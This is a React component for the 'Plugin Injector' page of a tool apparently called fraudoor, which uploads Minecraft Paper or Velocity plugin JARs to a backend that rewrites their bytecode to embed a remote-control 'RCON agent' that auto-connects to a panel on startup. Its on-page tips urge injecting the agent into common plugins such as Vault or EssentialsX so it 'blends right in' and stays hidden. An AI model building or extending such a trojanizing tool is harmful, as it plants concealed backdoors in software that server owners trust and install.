import React, { useState, useRef } from 'react';
import { apiUrl } from '../api';

export default function Injection() {
  const [platform, setPlatform] = useState('paper');
  const [file, setFile] = useState(null);
  const [dragging, setDragging] = useState(false);
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const fileRef = useRef(null);

  const handleDrop = (e) => {
    e.preventDefault();
    setDragging(false);
    const f = e.dataTransfer.files[0];
    if (f && f.name.endsWith('.jar')) setFile(f);
  };

  const handleFileSelect = (e) => {
    const f = e.target.files[0];
    if (f) setFile(f);
  };

  const handleInject = async () => {
    if (!file) return;
    setLoading(true);
    setResult(null);

    const formData = new FormData();
    formData.append('plugin', file);
    formData.append('platform', platform);

    try {
      const res = await fetch(apiUrl('/api/inject'), {
        method: 'POST',
        body: formData,
      });

      if (res.ok) {
        const blob = await res.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `injected-${file.name}`;
        a.click();
        URL.revokeObjectURL(url);
        setResult({
          type: 'success',
          message: `Injected! ${file.name} now has fraudoor RCON built in. The plugin will auto-connect on startup.`,
        });
      } else {
        const err = await res.json().catch(() => ({ error: 'unknown error' }));
        setResult({ type: 'error', message: err.error || 'injection failed' });
      }
    } catch (err) {
      setResult({ type: 'error', message: `Injection failed: ${err.message}` });
    }
    setLoading(false);
  };

  return (
    <div className="injection-container">
      <div className="injection-panel">
        <h2>Plugin Injector</h2>
        <p>
          Upload any Paper or Velocity plugin JAR. We inject our RCON agent
          directly into the bytecode — the plugin still works exactly as before,
          now with a fully functional RCON backend connected to your fraudoor panel.
        </p>
        <p>
          <strong>How it works:</strong> We rename the original main class, create a
          wrapper that calls <code>onEnable()</code> on the original then starts our
          RCON agent. All under <code>io/fraudoor/rcon/</code> — zero conflicts.
        </p>

        <div className="platform-select">
          <button
            className={`platform-btn ${platform === 'paper' ? 'active' : ''}`}
            onClick={() => setPlatform('paper')}
          >
            Paper / Spigot
          </button>
          <button
            className={`platform-btn ${platform === 'velocity' ? 'active' : ''}`}
            onClick={() => setPlatform('velocity')}
          >
            Velocity
          </button>
        </div>

        <div
          className={`drop-zone ${dragging ? 'dragging' : ''}`}
          onDragOver={(e) => { e.preventDefault(); setDragging(true); }}
          onDragLeave={() => setDragging(false)}
          onDrop={handleDrop}
          onClick={() => fileRef.current?.click()}
        >
          <div className="icon">📦</div>
          <div className="label">
            {file ? file.name : 'Drop a plugin JAR here or click to browse'}
          </div>
        </div>
        <input ref={fileRef} type="file" accept=".jar" style={{ display: 'none' }} onChange={handleFileSelect} />

        <button
          className="inject-btn"
          onClick={handleInject}
          disabled={!file || loading}
        >
          {loading
            ? 'Injecting...'
            : `Inject into ${file ? file.name : 'plugin'}`
          }
        </button>

        {result && (
          <div className={`inject-result ${result.type}`}>
            {result.message}
          </div>
        )}
      </div>

      <div className="injection-panel">
        <h2>How it works</h2>
        <p><strong>1.</strong> Upload any plugin JAR (Paper or Velocity)</p>
        <p><strong>2.</strong> Choose your platform</p>
        <p><strong>3.</strong> Click inject — the injector service uses ASM to:
          <br />• Rename the original main class
          <br />• Create a wrapper that calls the original + starts RCON
          <br />• Inject our agent class files
          <br />• Repack the JAR
        </p>
        <p><strong>4.</strong> Download the modified JAR — upload it to your server (only 1 plugin needed)</p>

        <div style={{
          marginTop: '20px',
          padding: '12px',
          background: 'var(--bg3)',
          borderRadius: 'var(--radius)',
          fontSize: '13px',
          color: 'var(--text2)',
        }}>
          <strong style={{ color: 'var(--orange)' }}>Pro tip:</strong> Inject into a plugin your server already
          uses (Vault, EssentialsX, anything). It'll blend right in — the RCON agent
          is completely hidden inside the JAR under <code>io/fraudoor/rcon/</code>.
        </div>

        <div style={{
          marginTop: '12px',
          padding: '12px',
          background: 'var(--bg3)',
          borderRadius: 'var(--radius)',
          fontSize: '13px',
          color: 'var(--text2)',
        }}>
          <strong style={{ color: 'var(--accent)' }}>Config:</strong> The RCON agent
          reads <code>config.yml</code> in the plugin folder for the server URL.
          Default: <code>ws://localhost:8080/ws</code>
        </div>
      </div>
    </div>
  );
}
